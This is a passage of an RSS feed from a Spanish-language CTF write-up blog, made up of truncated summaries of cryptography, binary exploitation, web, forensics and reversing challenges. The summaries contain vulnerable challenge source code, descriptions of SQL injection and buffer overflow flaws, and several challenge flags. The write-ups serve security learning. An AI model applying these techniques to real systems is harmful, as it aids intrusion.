░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓██▓▓████▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░░░░░░░ ░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓██▒▒▓▓▒▒▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ [+] Random secure encryption key has been generated!</description></item><item><title>Vigenère Cipher</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/vigenere-cipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/vigenere-cipher/</guid><description>Tenemos este texto cifrado:
DETctysy{QzeffcgRgcBhsjdkf} Y también una palabra extraña: blorpy.
Como el reto se llama &amp;ldquo;Vigenère Cipher&amp;rdquo;, podemos deducir que el algoritmo de cifrado es precisamente el Cifrado Vigenère, que es un tipo de cifrado César de sustitución. Para descifrar el mensaje, podemos ir a CyberChef y usar blorpy como clave:
Flag: CTFlearn{CiphersAreAwesome}.</description></item><item><title>Vitrium Stash</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/vitrium-stash/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/vitrium-stash/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from Crypto.Util.number import * from secrets import * import json """ from Crypto.PublicKey import DSA k = DSA.generate(2048) print(f"{k.p = }") print(f"{k.q = }") print(f"{k.g = }") """ p = 30514860220781649196505378618677588344627509796136052197766721133333403517227804826248671926331671978511695325934422209350872533631963158343821543243314354301612941382823755283391175569282500778759917825290265500008435125458284371701669393617263164707568562478942069967845682300866897274415749964510071038555145487346022921591488265881313448995313340365972250251431925090356830155846705412769705029295847471355919584592321591959772488755986181054597974081870037624260173234561447688627353479361867003340196122160639547860024025674714107946196423198018724048310862485718766310003158603549746994074302705926658218700843 q = 26189572440233739420990528170531051459310363621928135990243626537967 g = 6111748161621056558453263711027460170929636824002846224800107291166700007147256826554286465237732729099376511591848799483754962591483370638607627034808201246023891469880792589537431156477847873086973414247654773443349132863425799271140168302068820170758172107172379842519843597077356839020025609506792115532019927453283319270046204956352057936972814681479252626295814756888943630138110534869191473166355939365725603055249365076889191708484425425599800051451167006426087674425090967640170968963795028092131692666710522291627118158125917935888441403300632869010691598781782043810771106247022549721544793735832383283054 x = randbelow(p) y = pow(g, x, p) def sign(message): m = bytes_to_long(message) k = randbelow(p) r = pow(g, k, p) % q s = (inverse(k, q) * (m + x*r)) % q return r, s def verify(message, r, s): assert 0 &amp;lt; r &amp;lt; q assert 0 &amp;lt; s &amp;lt; q m = bytes_to_long(message) w = pow(s, -1, q) u1 = (m * w) % q u2 = (r * w) % q v = ((pow(g, u1, p) * pow(y, u2, p)) % p) % q return r == v menu = "</description></item><item><title>Void</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/void/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/void/</guid><description>Se nos proporciona un binario de 64 bits llamado void:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Ingeniería inversa Si usamos Ghidra, encontraremos este código descompilado en C:
void vuln() { char data[64]; read(0, data, 200); } int main() { vuln(); return 0; } El código es muy corto y solo hay un solo punto para ingresar datos.
Vulnerabilidad de Buffer Overflow Hay una clara vulnerabilidad de Buffer Overflow ya que data es un vector de char de 64 bytes, y read está leyendo hasta 200 bytes y almacena la información en data.</description></item><item><title>Void</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/void/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/void/</guid><description>Se nos proporciona un binario de 64 bits llamado void:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Ingeniería inversa Si usamos Ghidra, encontraremos este código descompilado en C:
void vuln() { char data[64]; read(0, data, 200); } int main() { vuln(); return 0; } El código es muy corto y solo hay un solo punto para ingresar datos.
Vulnerabilidad de Buffer Overflow Hay una clara vulnerabilidad de Buffer Overflow ya que data es un vector de char de 64 bytes, y read está leyendo hasta 200 bytes y almacena la información en data.</description></item><item><title>wafwaf</title><link>https://7rocky.github.io/ctf/htb-challenges/web/wafwaf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/wafwaf/</guid><description>Se nos proporciona el siguiente sitio web, que también muestra su código fuente en PHP:
Análisis del código fuente Lo primero que notamos es una inyección de código SQL bastante clara:
$obj = $db-&amp;gt;waf(file_get_contents('php://input')); $db-&amp;gt;query("SELECT note FROM notes WHERE assignee = '%s'", $obj-&amp;gt;user); Esto sucede porque el valor de $obj-&amp;gt;user se inserta directamente en la consulta SQL, sin prepared statements.
Sin embargo, hay una función waf que actúa como un WAF (Web Application Firewall):</description></item><item><title>Waiting List</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/waiting-list/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/waiting-list/</guid><description>Se nos proporciona el código fuente del servidor en Python (challenge.py):
import json import signal import subprocess import socketserver from hashlib import sha1 from random import randint from Crypto.Util.number import bytes_to_long, long_to_bytes FLAG = 'HTB{dummyflag}' class ECDSA: def __init__(self): self.n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 self.k = 0 self.g = 5 self.key = ... #choose your own key def sign(self, pt): h = sha1(pt).digest() h = bytes_to_long(h) h = bin(h)[2:] h = int(h[:len(bin(self.n)[2:])], 2) self.</description></item><item><title>Walkie Hackie</title><link>https://7rocky.github.io/ctf/htb-challenges/hardware/walkie-hackie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/hardware/walkie-hackie/</guid><description>Se nos proporcionan cuatro capturas de señales de radiofrecuencia (desde 1.complex hasta 4.complex) y un sitio web para probar códigos:
Además, esta es la descripción del reto:
Our agents got caught during a mission and found that the guards are using old walkie-talkies for their communication. The field team captured their transmissions. Can you interrupt their communication to help our agents escape from the guards?
Análisis de radiofrecuencia Aunque hay una pista en el código HTML del sitio web que apunta a Universal Radio Hacker, prefiero usar inspectrum.</description></item><item><title>Watch Tower</title><link>https://7rocky.github.io/ctf/htb-challenges/hardware/watch-tower/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/hardware/watch-tower/</guid><description>Se nos dice que alguien ha estado recopilando y alterando información en la red. Además, se nos da un archivo llamado tower_logs.pcapng.
Análisis de tráfico de red Si abrimos el archivo PCAP en Wireshark, veremos muchos paquetes Modbus:
Modbus Algo interesante a mirar es el código de función. Hay tres códigos de función involucrados en esta captura de red (más información en Wikipedia):
Write Multiple Coils Read Coil Write Multiple Registers El que parece relevante es Write Multiple Registers porque solamente hay 2 paquetes con Write Multiple Coils y los paquetes de Read Coil no parecen contener ningún dato.</description></item><item><title>Watersnake</title><link>https://7rocky.github.io/ctf/htb-challenges/web/watersnake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/watersnake/</guid><description>Se nos da un sitio web como este:
También tenemos el código fuente en Java (SpringBoot).
Análisis del código fuente Este es el archivo principal de la aplicación (Application.java):
package com.lean.watersnake; import java.util.Arrays; import org.springframework.boot.CommandLineRunner; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.ApplicationContext; @SpringBootApplication public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } } Podemos encontrar los endpoints disponibles en Controller.java:
package com.lean.watersnake; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.</description></item><item><title>Weak RSA</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/weak-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/weak-rsa/</guid><description>Se nos proporciona una clave pública en formato PEM de una implementación de RSA (key.pub):
-----BEGIN PUBLIC KEY----- MIIBHzANBgkqhkiG9w0BAQEFAAOCAQwAMIIBBwKBgQMwO3kPsUnaNAbUlaubn7ip 4pNEXjvUOxjvLwUhtybr6Ng4undLtSQPCPf7ygoUKh1KYeqXMpTmhKjRos3xioTy 23CZuOl3WIsLiRKSVYyqBc9d8rxjNMXuUIOiNO38ealcR4p44zfHI66INPuKmTG3 RQP/6p5hv1PYcWmErEeDewKBgGEXxgRIsTlFGrW2C2JXoSvakMCWD60eAH0W2PpD qlqqOFD8JA5UFK0roQkOjhLWSVu8c6DLpWJQQlXHPqP702qIg/gx2o0bm4EzrCEJ 4gYo6Ax+U7q6TOWhQpiBHnC0ojE8kUoqMhfALpUaruTJ6zmj8IA1e1M6bMqVF8sr lb/N -----END PUBLIC KEY----- $ python3 -q &amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA &amp;gt;&amp;gt;&amp;gt; key = RSA.import_key(open('key.pub').read()) &amp;gt;&amp;gt;&amp;gt; key.n 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 &amp;gt;&amp;gt;&amp;gt; key.e 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605 RSA funciona de la siguiente manera: Se cogen dos números primos grandes $p$ y $q$ y se toma $n = pq$ como módulo. Luego, se coge un exponente $e$ (típicamente $e = 65537$) y se cifra el mensage $m$ en formato decimal:</description></item><item><title>Web3</title><link>https://7rocky.github.io/ctf/other/balsn-ctf/web3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/balsn-ctf/web3/</guid><description>Se nos proporciona una aplicación en Node.js que usa Web3:
const express = require("express"); const ethers = require("ethers"); const path = require("path"); const app = express(); app.use(express.urlencoded()); app.use(express.json()); app.get("/", function(_req, res) { res.sendFile(path.join(__dirname + "/server.js")); }); function isValidData(data) { if (/^0x[0-9a-fA-F]+$/.test(data)) { return true; } return false; } app.post("/exploit", async function(req, res) { try { const message = req.body.message; const signature = req.body.signature; if (!isValidData(signature) || isValidData(message)) { res.send("wrong data"); return; } const signerAddr = ethers.</description></item><item><title>what's a net cat?</title><link>https://7rocky.github.io/ctf/picoctf/general-skills/whats-a-net-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/general-skills/whats-a-net-cat/</guid><description>Se nos proporciona una instancia remota a la que conectarnos. Si establecemos la conexión con nc, obtenemos la flag:
$ nc jupiter.challenges.picoctf.org 25103 You're on your way to becoming the net cat master picoCTF{nEtCat_Mast3ry_d0c64587}</description></item><item><title>where are the robots</title><link>https://7rocky.github.io/ctf/picoctf/web-exploitation/where-are-the-robots/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/web-exploitation/where-are-the-robots/</guid><description>Se nos proporciona una página web como esta:
La página habla de robots. Existe un archivo especial llamado robots.txt que previene a crawlers y arañas web que accedan a ciertas rutas listadas en el archivo. Vamos a echar un vistazo:
Genial, hay una línea Disallow: /8028f.html, que no significa que no podamos entrar (solamente dice a los escáneres automáticos que no entren). Este es /8028f.html:
Y ahí está la flag:</description></item><item><title>Whole Lotta Candy</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/whole-lotta-candy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/whole-lotta-candy/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from encrypt import Encryptor from secret import FLAG import socketserver import random import signal import json MODES = ['ECB', 'CBC', 'CFB', 'OFB', 'CTR'] class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def main(s): mode = random.choice(MODES) enc = Encryptor() while True: try: sendMessage(s, f"Please interact with the server using json data!</description></item><item><title>Whole Lotta Candy</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/whole-lotta-candy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/whole-lotta-candy/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from encrypt import Encryptor from secret import FLAG import socketserver import random import signal import json MODES = ['ECB', 'CBC', 'CFB', 'OFB', 'CTR'] class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def main(s): mode = random.choice(MODES) enc = Encryptor() while True: try: sendMessage(s, f"Please interact with the server using json data!</description></item><item><title>WIDE</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/wide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/wide/</guid><description>Se nos proporciona un binario de 64 bits llamado wide y otro archivo llamado db.ex con algunas cadenas de texto:
$ file wide wide: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=13869bb7ce2c22f474b95ba21c9d7e9ff74ecc3f, not stripped $ strings db.ex Primus people breathe variety practice Our home dimension Cheagaz scene control river importance The Ice Dimension Byenoovia fighting cast it parallel The Berserk Dimension Cloteprea facing motor unusual heavy The Hungry Dimension Maraqa stomach motion sale valuable The Water Dimension Aidor feathers stream sides gate The Bone Dimension Flaggle Alpha admin secret power hidden HOt* 0ANe Si ejeutamos el binario tenemos lo siguiente:</description></item><item><title>Wild Goose Hunt</title><link>https://7rocky.github.io/ctf/htb-challenges/web/wild-goose-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/wild-goose-hunt/</guid><description>Se nos proporciona este sitio web:
También tenemos el código fuente del proyecto en Node.js (Express).
Análisis del código fuente Este es index.js:
const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const routes = require('./routes'); const mongoose = require('mongoose'); mongoose.connect('mongodb://localhost:27017/heros', { useNewUrlParser: true , useUnifiedTopology: true }); app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: true })); app.use(express.static('static')); app.set('view engine', 'pug'); app.use(routes); app.all('*', (req, res) =&amp;gt; { return res.status(404).send({ message: '404 page not found' }); }); app.</description></item><item><title>winter</title><link>https://7rocky.github.io/ctf/other/dicectf/winter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/dicectf/winter/</guid><description>Se nos proporciona el código fuente en Python de un servidor:
#!/usr/local/bin/python import os from hashlib import sha256 class Wots: def __init__(self, sk, vk): self.sk = sk self.vk = vk @classmethod def keygen(cls): sk = [os.urandom(32) for _ in range(32)] vk = [cls.hash(x, 256) for x in sk] return cls(sk, vk) @classmethod def hash(cls, x, n): for _ in range(n): x = sha256(x).digest() return x def sign(self, msg): m = self.</description></item><item><title>WOTS Up</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/wots-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/wots-up/</guid><description>With the need to find post-quantum schemes, hash-based signatures are cool again.
Challenge contributed by CryptoHack
Challenge files:
data.json chal.py Se nos da una clase llamada Winternitz que implementa un protocolo de firma basado en el hash SHA256. En realidad, WOTS significa Winternitz One-Time Signature y es un algoritmo post-cuántico de firma, que se explica perfectamente en www.codingninjas.com.
Análisis del código fuente En primer lugar, la clase crea una lista de claves privadas:</description></item><item><title>WOTS Up 2</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/wots-up-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/wots-up-2/</guid><description>I fixed the problem with my last scheme, now I can confidently sign my WOTScoin transactions.
Challenge contributed by CryptoHack
Challenge files:
data.json chal.py Este es otro reto que implementa WOTS (más información en www.codingninjas.com).
Análisis del código fuente La clase Winternitz es un poco diferente de la primera parte del reto, en la generación de teclas:
class Winternitz: def __init__(self): self.priv_key = [] for _ in range(KEY_LEN): priv_seed = urandom(KEY_LEN) self.</description></item><item><title>WOW... So Meta</title><link>https://7rocky.github.io/ctf/ctflearn/forensics/wow...-so-meta/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/forensics/wow...-so-meta/</guid><description>Se nos pide encontrar la flag en esta imagen:
Sin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. Como el reto habla de &amp;ldquo;Meta&amp;rdquo;, lo mismo la flag se encuentra en los metadatos del archivo.
Para extraer los metadatos podemos utilizar exiftool y filtrar por CTFlearn encadenando el comando anterior con grep:
$ exiftool 3UWLBAUCb9Z2.jpg | grep CTFlearn Camera Serial Number : CTFlearn{EEe_x_I_FFf}</description></item><item><title>Wrong Spooky Season</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/wrong-spooky-season/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/wrong-spooky-season/</guid><description>Se nos proporciona un archivo con una captura de tráfico de red llamado capture.pcap:
Análisis de tráfico Podemos usar Wireshark para analizarlo:
Mensajes HTTP Hay un montón de paquetes. Vamos a filtrar primero por HTTP:
Vale, ahora hay muchos menos paquetes para analizar.
Existen algunos mensajes HTTP que destacan al final. Podemos pensar que un usuario malintencionado está ejecutando comandos de sistema en el servidor de forma remota (cmd=whoami, cmd=id &amp;hellip;).</description></item><item><title>Wrong Spooky Season</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/wrong-spooky-season/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/wrong-spooky-season/</guid><description>Se nos proporciona un archivo con una captura de tráfico de red llamado capture.pcap:
Análisis de tráfico Podemos usar Wireshark para analizarlo:
Mensajes HTTP Hay un montón de paquetes. Vamos a filtrar primero por HTTP:
Vale, ahora hay muchos menos paquetes para analizar.
Existen algunos mensajes HTTP que destacan al final. Podemos pensar que un usuario malintencionado está ejecutando comandos de sistema en el servidor de forma remota (cmd=whoami, cmd=id &amp;hellip;).</description></item><item><title>XORed</title><link>https://7rocky.github.io/ctf/imaginaryctf/xored/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/xored/</guid><description>El programa dice que alguien ha usado un cifrado XOR con una clave de un solo byte. Este es el resultado: * 7%8-s70&amp;amp; 61&amp;amp;&amp;gt;.
Como sabemos que las flags empiezan por ictf{, podemos obtener la clave mediante &amp;quot;*&amp;quot; ^ &amp;quot;i&amp;quot; debido a las propiedades del cifrado XOR:
$$ c = m \oplus k \iff k = c \oplus m $$ Entonces podemos resolver el reto así:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; from pwn import xor &amp;gt;&amp;gt;&amp;gt; c = b'* 7%8-s70&amp; 61&amp;&amp;gt;' &amp;gt;&amp;gt;&amp;gt; k = xor(c[0], b'i') &amp;gt;&amp;gt;&amp;gt; m = xor(c, k) &amp;gt;&amp;gt;&amp;gt; m b'ictf{n0tsecure}'</description></item><item><title>xorrot</title><link>https://7rocky.github.io/ctf/imaginaryctf/xorrot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/xorrot/</guid><description>Se nos proporciona el código fuente para cifrar la flag, y también el texto cifrado como un comentario en el código:
#!/usr/bin/env python3 flag = open('flag.txt', 'rb').read() key = open('/dev/urandom','rb').read(1)[0] out = [] for c in flag: out.append(c ^ key) key = c print(f'{bytes(out).hex() = }') # bytes(out).hex() = '970a17121d121d2b28181a19083b2f021d0d03030e1526370d091c2f360f392b1c0d3a340e1c263e070003061711013b32021d173a2b1c090f31351f06072b2b1c0d3a390f1b01072b3c0b09132d33030311' A partir del código fuente, podemos ver que la clave es un solo byte. Además, la clave se actualiza con el caracter en claro actual.</description></item><item><title>yaonet</title><link>https://7rocky.github.io/ctf/other/dicectf/yaonet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/dicectf/yaonet/</guid><description>Se nos proporcionan dos archivos id_ecdsa, id_ecdsa.pub y una instancia remota para conectarnos usando SSH:
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null yaonet@mc.ax -p 31000 -i id_ecdsa La clave privada id_ecdsa está corrupta:
-----BEGIN OPENSSH PRIVATE KEY----- ??????????1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA???????????????????????? ??????????c3RwMjU2AAAACG5pc3RwMjU2AAAAQQR72Bqp???????????????????????? ??????????1hSxoXrVpRtsx1F2GIgXAqI/6MxuS7Bq86XF???????????????????????? ??????????ZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAy???????????????????????? ??????????lSEQfdEcgOhx7zvWFLGhetWlG2zHUXYYiBcC???????????????????????? ??????????37PMrof3dNCpeuwsSUupbaUh3/+7+eDnRH+3???????????????????????? -----END OPENSSH PRIVATE KEY----- Y la clave pública id_ecdsa.pub es correcta:
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHvYGqk903tU4dOcBPTbZ9xl5rlSEQfdEcgOhx7zvWFLGhetWlG2zHUXYYiBcCoj/ozG5LsGrzpcXE3HuEzPEQg= yaonet Tendremos que arreglar la clave privada para conectarnos a la instancia remota y obtener la flag.</description></item><item><title>You Cant C Me</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/you-cant-c-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/you-cant-c-me/</guid><description>Se nos proporciona un binario llamado auth:
$ file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped Si lo ejecutamos, pregunta por una clave:
$ ./auth Welcome! Podemos introducir una clave y ver que no es correcta:
$ ./baby Insert key: asdf I said, you can't c me! Podemos hacer uso de ltrace para ver las llamadas a funciones externas (funciones que pertenecen a librerías como Glibc):</description></item><item><title>zero_to_hero</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/zero_to_hero/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/zero_to_hero/</guid><description>Se nos proporciona un binario de 64 bits llamado zero_to_hero:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' También tenemos la librería compartida Glibc y el loader (versión 2.29):
$ ./ld-2.29.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29. Copyright (C) 2019 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Zombie Rolled</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/zombie-rolled/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/zombie-rolled/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from Crypto.Util.number import getPrime, bytes_to_long from fractions import Fraction from math import prod from hashlib import sha256 from secrets import randbelow # I hope no one cares about Kerckhoff's principle :) from secret import derive_public_key, FLAG def fraction_mod(f, n): return f.numerator * pow(f.denominator, -1, n) % n class PublicKey: def __init__(self, pub, n): self.pub = pub self.f = self.</description></item><item><title>Zombie Rolled</title><link>https://7rocky.github.io/ctf/other/htb-unictf/zombie-rolled/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/zombie-rolled/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from Crypto.Util.number import getPrime, bytes_to_long from fractions import Fraction from math import prod from hashlib import sha256 from secrets import randbelow # I hope no one cares about Kerckhoff's principle :) from secret import derive_public_key, FLAG def fraction_mod(f, n): return f.numerator * pow(f.denominator, -1, n) % n class PublicKey: def __init__(self, pub): self.pub = pub self.f = self.magic(pub) self.</description></item><item><title>Zombiedote</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/</guid><description>Se nos proporciona un binario de 64 bits llamado zombiedote:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Tenemos un menú típico de un reto de explotación del heap:
$ ./zombiedote [ BioShield Solutions Research Institute ] Virus Concentration Levels Logging - Manual Mode: ON [ MANUAL MODE LOGGING ] [1] Create log [2] Insert into log [3] Delete log [4] Edit log [5] Inspect log &amp;gt;&amp;gt; Si abrimos el binario en Ghidra, veremos el código fuente en C descompilado para el programa.</description></item><item><title>Zombiedote</title><link>https://7rocky.github.io/ctf/other/htb-unictf/zombiedote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/zombiedote/</guid><description>Se nos proporciona un binario de 64 bits llamado zombiedote:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Tenemos un menú típico de un reto de explotación del heap:
$ ./zombiedote [ BioShield Solutions Research Institute ] Virus Concentration Levels Logging - Manual Mode: ON [ MANUAL MODE LOGGING ] [1] Create log [2] Insert into log [3] Delete log [4] Edit log [5] Inspect log &amp;gt;&amp;gt; Si abrimos el binario en Ghidra, veremos el código fuente en C descompilado para el programa.</description></item><item><title>Zombienator</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/zombienator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/zombienator/</guid><description>Se nos proporciona un binario de 64 bits llamado zombienator:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si abrimos el binario en Ghidra, veremos este código fuente en C descompilado para la función main:
void main() { ulong option; banner(); while (true) { while (true) { while (true) { printf("\n##########################\n# #\n# 1. Create Zombienator #\ n# 2. Remove Zombienator #\n# 3.</description></item><item><title>Zombienator</title><link>https://7rocky.github.io/ctf/other/htb-unictf/zombienator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/zombienator/</guid><description>Se nos proporciona un binario de 64 bits llamado zombienator:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si abrimos el binario en Ghidra, veremos este código fuente en C descompilado para la función main:
void main() { ulong option; banner(); while (true) { while (true) { while (true) { printf("\n##########################\n# #\n# 1. Create Zombienator #\ n# 2. Remove Zombienator #\n# 3.</description></item></channel></rss>